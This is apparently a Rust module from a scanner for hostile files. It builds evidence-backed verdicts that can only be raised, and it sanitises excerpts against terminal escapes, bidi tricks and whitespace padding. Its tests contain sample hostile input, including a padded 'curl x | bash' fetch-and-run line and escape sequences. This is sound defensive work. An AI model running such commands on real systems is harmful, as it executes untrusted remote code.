use serde::Serialize;

/// Ordered by how far each one moves the verdict floor, so `max` is the combining rule.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum Severity {
    Info,
    /// Something will run that we could not look at.
    Opaque,
    Warning,
    Danger,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum Verdict {
    NoRedFlagsFound,
    CouldNotTell,
    Suspicious,
    Dangerous,
}

impl Verdict {
    pub fn floor_for(severity: Severity) -> Self {
        match severity {
            Severity::Info => Verdict::NoRedFlagsFound,
            Severity::Opaque => Verdict::CouldNotTell,
            Severity::Warning => Verdict::Suspicious,
            Severity::Danger => Verdict::Dangerous,
        }
    }

    /// A second opinion (a model, a later stage) may only make the verdict worse.
    pub fn raised_by(self, other: Verdict) -> Verdict {
        self.max(other)
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Location {
    pub path: String,
    pub line: Option<usize>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Evidence {
    /// Assigned by [`Report::build`]; every sentence of a verdict cites one.
    pub id: String,
    pub rule: &'static str,
    pub severity: Severity,
    pub location: Option<Location>,
    pub summary: String,
    pub excerpt: Option<String>,
}

impl Evidence {
    pub fn new(rule: &'static str, severity: Severity, summary: impl Into<String>) -> Self {
        Evidence {
            id: String::new(),
            rule,
            severity,
            location: None,
            summary: summary.into(),
            excerpt: None,
        }
    }

    pub fn at(mut self, path: impl Into<String>, line: Option<usize>) -> Self {
        self.location = Some(Location {
            path: path.into(),
            line,
        });
        self
    }

    pub fn excerpt(mut self, text: &str) -> Self {
        self.excerpt = Some(sanitise_excerpt(text, 200));
        self
    }
}

#[derive(Debug, Clone, Serialize)]
pub struct Report {
    pub verdict: Verdict,
    pub evidence: Vec<Evidence>,
    pub unchecked: Vec<String>,
}

impl Report {
    pub fn build(mut evidence: Vec<Evidence>, unchecked: Vec<String>) -> Self {
        evidence.sort_by_key(|e| std::cmp::Reverse(e.severity));
        for (i, e) in evidence.iter_mut().enumerate() {
            e.id = format!("E{}", i + 1);
        }
        let verdict = evidence
            .iter()
            .map(|e| Verdict::floor_for(e.severity))
            .max()
            .unwrap_or(Verdict::NoRedFlagsFound);
        Report {
            verdict,
            evidence,
            unchecked,
        }
    }

    /// Rebuilds with more evidence; the verdict can only stay or rise.
    pub fn with_more(self, more: Vec<Evidence>, unchecked: Vec<String>) -> Self {
        let before = self.verdict;
        let mut evidence = self.evidence;
        evidence.extend(more);
        let mut all = self.unchecked;
        all.extend(unchecked);
        let mut report = Report::build(evidence, all);
        report.raise(before);
        report
    }

    pub fn raise(&mut self, proposed: Verdict) {
        self.verdict = self.verdict.raised_by(proposed);
    }
}

/// Excerpts come from hostile files and end up on a terminal: escape sequences could rewrite
/// the verdict line, and long whitespace runs are how lures push code off-screen.
pub fn sanitise_excerpt(text: &str, max_chars: usize) -> String {
    let mut out = String::new();
    let mut in_space = false;
    for c in text.chars() {
        if c.is_whitespace() {
            if !in_space && !out.is_empty() {
                out.push(' ');
            }
            in_space = true;
            continue;
        }
        in_space = false;
        if c.is_control() || is_bidi_control(c) {
            out.push_str(&format!("\\u{{{:x}}}", c as u32));
        } else {
            out.push(c);
        }
    }
    let out = out.trim_end();
    if out.chars().count() > max_chars {
        let cut: String = out.chars().take(max_chars).collect();
        format!("{cut}…")
    } else {
        out.to_string()
    }
}

fn is_bidi_control(c: char) -> bool {
    matches!(c, '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}' | '\u{200e}' | '\u{200f}')
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_second_opinion_cannot_lower_the_floor() {
        let mut report = Report::build(
            vec![Evidence::new("r", Severity::Danger, "bad")],
            Vec::new(),
        );
        report.raise(Verdict::NoRedFlagsFound);
        assert_eq!(report.verdict, Verdict::Dangerous);
    }

    #[test]
    fn a_second_opinion_can_raise_the_floor() {
        let mut report = Report::build(Vec::new(), Vec::new());
        assert_eq!(report.verdict, Verdict::NoRedFlagsFound);
        report.raise(Verdict::Suspicious);
        assert_eq!(report.verdict, Verdict::Suspicious);
    }

    #[test]
    fn worst_evidence_sets_the_verdict_and_is_cited_first() {
        let report = Report::build(
            vec![
                Evidence::new("a", Severity::Info, "runs on install"),
                Evidence::new("b", Severity::Opaque, "unseen download"),
                Evidence::new("c", Severity::Warning, "reads ssh keys"),
            ],
            Vec::new(),
        );
        assert_eq!(report.verdict, Verdict::Suspicious);
        assert_eq!(report.evidence[0].rule, "c");
        assert_eq!(report.evidence[0].id, "E1");
        assert_eq!(report.evidence[2].id, "E3");
    }

    #[test]
    fn more_evidence_renumbers_and_never_lowers() {
        let mut first = Report::build(vec![Evidence::new("a", Severity::Info, "x")], vec![]);
        first.raise(Verdict::Suspicious);
        let merged = first.with_more(
            vec![Evidence::new("b", Severity::Danger, "y")],
            vec!["u".into()],
        );
        assert_eq!(merged.verdict, Verdict::Dangerous);
        assert_eq!(merged.evidence[0].rule, "b");
        assert_eq!(merged.evidence[0].id, "E1");
        assert_eq!(merged.unchecked, vec!["u".to_string()]);
        let kept = Report::build(vec![], vec![]).with_more(vec![], vec![]);
        assert_eq!(kept.verdict, Verdict::NoRedFlagsFound);
    }

    #[test]
    fn info_alone_finds_no_red_flags() {
        let report = Report::build(vec![Evidence::new("a", Severity::Info, "x")], Vec::new());
        assert_eq!(report.verdict, Verdict::NoRedFlagsFound);
    }

    #[test]
    fn excerpts_cannot_carry_terminal_escapes_or_bidi_tricks() {
        let s = sanitise_excerpt("ok\x1b[2K\x1b[1A\u{202e}evil", 200);
        assert!(!s.contains('\x1b'));
        assert!(!s.contains('\u{202e}'));
        assert!(s.contains("\\u{1b}"));
        assert!(s.contains("\\u{202e}"));
    }

    #[test]
    fn excerpts_collapse_whitespace_padding() {
        let padded = format!("{{\"command\": \"echo hi\"{}curl x | bash", " ".repeat(300));
        assert_eq!(
            sanitise_excerpt(&padded, 200),
            "{\"command\": \"echo hi\" curl x | bash"
        );
    }

    #[test]
    fn excerpts_are_truncated() {
        let s = sanitise_excerpt(&"a".repeat(500), 10);
        assert_eq!(s, "aaaaaaaaaa…");
    }
}
